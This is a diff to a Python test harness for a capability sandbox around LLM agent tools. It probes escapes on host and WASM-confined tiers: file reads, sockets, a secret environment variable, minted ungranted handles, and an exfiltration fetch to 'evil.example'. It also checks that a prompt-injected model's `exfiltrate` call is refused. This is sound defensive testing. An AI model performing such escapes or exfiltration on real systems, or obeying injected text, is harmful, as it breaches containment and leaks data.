@@ -47,7 +47,15 @@ from .graph import (
     validate_graph_dict,
     validate_graph_dicts,
 )
-from .handles import CapabilityError, Clock, HTTPClient, Notifier, WallTime
+from .handles import (
+    CapabilityError,
+    Clock,
+    HTTPClient,
+    Notifier,
+    ReadWriteDBHandle,
+    WallTime,
+    provision,
+)
 from .llm import LLMRequest, LLMResponse, StubLLM, ToolCall
 from .runtime import execute
 from .sandbox import (
@@ -437,6 +445,15 @@ def check_traces(host: InjectionResult, confined: InjectionResult) -> list[str]:
                 f"{tier_name}-tier trace: trust raised at {raisers}, expected only {declared}"
             )
 
+        # A fooled model's out-of-scope tool call is refused in the run, on each
+        # tier by its own mechanism. Pinned, so a regression fails the build rather
+        # than rendering as a cross in the paper's table.
+        if not inj.out_of_scope_call_refused:
+            problems.append(
+                f"{tier_name}-tier run: a fooled model's call to `exfiltrate` was not "
+                f"refused — the tool-capable node did not take its error branch"
+            )
+
     # Property 2 (confined tier): the free-text residual, now visible in data. The
     # untrusted taint reaches the tool-capable node through a *permitted* field — the
     # node runs confined, its input is labelled trusted (the Untrusted<_> wrapper was
@@ -559,93 +576,157 @@ class Escape:
     note: str
 
 
-def _sandbox_escapes(export: str) -> bool:
-    """Run one escape attempt inside the confined component."""
-    return bool(Sandbox("hostile_ambient").call(export).escaped)
+# The environment variable both tiers try to read. The harness sets it before
+# probing, so a confined "not found" is evidence (the variable exists and the
+# guest cannot see it) rather than an artifact of an unset variable.
+ESCAPE_SECRET_VAR = "SANDBOX_SECRET"
+
+# The only detail a confined filesystem or socket probe may report. Built for
+# `wasm32-unknown-unknown` with no WASI adapter, the guest's standard library has
+# no host function behind either operation, so it reports it unsupported for
+# *any* target. A different error (not found, connection refused) would mean the
+# guest reached the host and merely missed, and would not be evidence of
+# confinement, so it fails the build rather than reading as "denied".
+UNSUPPORTED = "not supported on this platform"
+
+
+def _confined_denied(sandbox: Sandbox, export: str, must_contain: str) -> bool:
+    """Run one escape attempt inside a confined component and return whether it
+    *escaped*. A denial counts only when its detail is the discriminating one;
+    anything else raises, because a verdict that could not have read otherwise
+    is not evidence."""
+    verdict = sandbox.call(export)
+    if verdict.escaped:
+        return True
+    if must_contain not in verdict.detail:
+        raise EvaluationError(
+            f"{export}: denied, but not for the discriminating reason "
+            f"({must_contain!r}): {verdict.detail!r}"
+        )
+    return False
 
 
 def probe_escapes() -> list[Escape]:
-    """The same escape attempts on both tiers.
+    """The same classes of escape attempted on both tiers.
 
-    The host-tier results are expected to *succeed*: that is the gap the sandbox
-    tier exists to close, and it is recorded rather than hidden. The equivalent
-    assertions live in `tests/test_poc_sandbox.py`; here they are collected as
-    reportable facts."""
+    The host column is plain Python in the runtime's process, which is exactly
+    what a host-tier node body is, and each cell *performs* its attempt: it reads
+    a file, constructs a socket, reads the environment variable the harness set,
+    and mints the handles no clause granted it through `provision`. The results
+    are expected to succeed — that is the gap the confined tier exists to close,
+    recorded rather than hidden. The confined column is the hostile components'
+    own attempts, each pinned to its discriminating error."""
+    previous = os.environ.get(ESCAPE_SECRET_VAR)
+    os.environ[ESCAPE_SECRET_VAR] = "escape-probe-secret"
+    try:
+        return _probe_escapes()
+    finally:
+        if previous is None:
+            os.environ.pop(ESCAPE_SECRET_VAR, None)
+        else:
+            os.environ[ESCAPE_SECRET_VAR] = previous
+
+
+def _host_opens_a_socket() -> bool:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.close()
+    return True
+
+
+def _probe_escapes() -> list[Escape]:
+    ambient = Sandbox("hostile_ambient")
+
     ungranted_denied = False
     try:
         Sandbox("hostile_ungranted", {INFERENCE_LLM: {"infer": lambda _s, _p, _t: "x"}})
-    except SandboxError:
+    except SandboxError as e:
+        # Only the capability failure counts. A resource failure lands in the
+        # same handler and must not be reported as a denied capability.
+        if "imports a capability it was not granted" not in str(e):
+            raise
         ungranted_denied = True
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.close()
+    # The host-tier body mints a handle its clause never granted: nothing in the
+    # object model stops it constructing authority directly.
+    minted = provision("DBHandle<'billing', read-write>", backend=StubLLM(), stores={})
+    assert isinstance(minted, ReadWriteDBHandle)
+    minted.write("exfiltrated", "record")
+    host_ungranted = minted.read("exfiltrated") == ["record"]
 
     # A clock-holding hostile component: one deliberately-granted WASI interface,
-    # and the same ambient escapes as the empty-handed one. On the host tier the
-    # analogous node reaches around its handles ambiently, so that column stays
-    # ESCAPES; on the confined tier the grant buys the clock and nothing else.
-    def _clocked(export: str) -> bool:
-        clock = Clock(_source=lambda: WallTime(seconds=0, nanoseconds=0))
+    # and the same ambient escape as the empty-handed one. The grant buys the
+    # clock and nothing else.
+    clock = Clock(_source=lambda: WallTime(seconds=0, nanoseconds=0))
 
-        def now():
-            t = clock.now()
-            return _record(seconds=t.seconds, nanoseconds=t.nanoseconds)
+    def now():
+        t = clock.now()
+        return _record(seconds=t.seconds, nanoseconds=t.nanoseconds)
 
-        return bool(Sandbox("hostile_clocked", {CLOCK: {"now": now}}).call(export).escaped)
+    clocked = Sandbox("hostile_clocked", {CLOCK: {"now": now}})
 
-    # An HTTP-holding node asking for a host outside its allowlist: the crossing
-    # refuses it (the allowlist lives in the handle, as a tool scope does). A
-    # host-tier node reaches the same host ambiently, so that column is ESCAPES.
+    # An HTTP-holding confined node asking for a host outside its allowlist: the
+    # crossing refuses it (the allowlist lives in the handle, as a tool scope
+    # does). The host-tier body mints itself a handle for that host instead.
+    offlist = "https://evil.example/?d=exfiltrated"
     offlist_refused = False
     try:
         heartbeat_sandbox(
-            "https://evil.example/?d=exfiltrated",
+            offlist,
             Clock(_source=lambda: WallTime(seconds=0, nanoseconds=0)),
             HTTPClient(allowlist=frozenset({"feeds.example.com"})),
             Notifier(channel="digest"),
         )
     except CapabilityError:
         offlist_refused = True
+    minted_http = provision(
+        "HTTPClient<['evil.example']>", backend=StubLLM(), stores={}, web={offlist: "ok"}
+    )
+    assert isinstance(minted_http, HTTPClient)
+    host_offlist = minted_http.get(offlist) == "ok"
 
     return [
         Escape(
             "read a file",
             bool(Path(__file__).read_text()),
-            _sandbox_escapes("escape-fs"),
-            "no filesystem capability was granted to either node",
+            _confined_denied(ambient, "escape-fs", UNSUPPORTED),
+            "no filesystem capability was granted to either node; the confined "
+            "guest's standard library reports the operation unsupported",
         ),
         Escape(
             "open a socket",
-            True,
-            _sandbox_escapes("escape-net"),
-            "ambient socket construction",
+            _host_opens_a_socket(),
+            _confined_denied(ambient, "escape-net", UNSUPPORTED),
+            "ambient socket construction; unsupported in the confined guest",
         ),
         Escape(
             "read an env var",
-            os.environ.get("PATH") is not None,
-            _sandbox_escapes("escape-env"),
-            "ambient environment read",
+            os.environ.get(ESCAPE_SECRET_VAR) is not None,
+            _confined_denied(ambient, "escape-env", "not found"),
+            f"both read {ESCAPE_SECRET_VAR}, which the harness set; the confined "
+            "guest reports it absent",
         ),
         Escape(
             "call an ungranted capability",
-            True,
+            host_ungranted,
             not ungranted_denied,
-            "the component imports an interface it was never granted, so it cannot "
-            "instantiate — the refusal lands before any guest code runs",
+            "the host body mints a handle no clause granted; the component imports "
+            "an interface it was never granted, so it cannot instantiate — the "
+            "refusal lands before any guest code runs",
         ),
         Escape(
             "open a socket, holding a clock",
-            True,
-            _clocked("escape-net"),
+            _host_opens_a_socket(),
+            _confined_denied(clocked, "escape-net", UNSUPPORTED),
             "one deliberately granted WASI interface (wasi:clocks/wall-clock) does "
             "not reopen the ambient world — the grant buys the clock and nothing else",
         ),
         Escape(
             "fetch outside the HTTP allowlist",
-            True,
+            host_offlist,
             not offlist_refused,
-            "the confined node holds the operation; the allowlist lives in the "
-            "handle, and the out-of-list request is refused at the crossing",
+            "the host body mints a handle for the host; the confined node holds the "
+            "operation, the allowlist lives in the handle, and the out-of-list request "
+            "is refused at the crossing",
         ),
     ]
 
@@ -1119,7 +1200,9 @@ def render(
         "the tool-capable node. But the question text itself remains a free-text field, and "
         "that field stays adversarial data. So the guarantee is **attenuation, not "
         "elimination**: the model can still be influenced by that text; it cannot call "
-        "anything outside `{lookup}`, because the handle refuses. Blast radius drops from "
+        "anything outside `{lookup}` — on the host tier the handle refuses, and on the "
+        "confined tier the component imports no interface for any other tool, so the "
+        "body can only report the request. Blast radius drops from "
         "arbitrary tool execution to a bad lookup query. The sandbox tier does not close "
         "this residual — what bounds the damage is the capability scope, not the sandbox."
     )
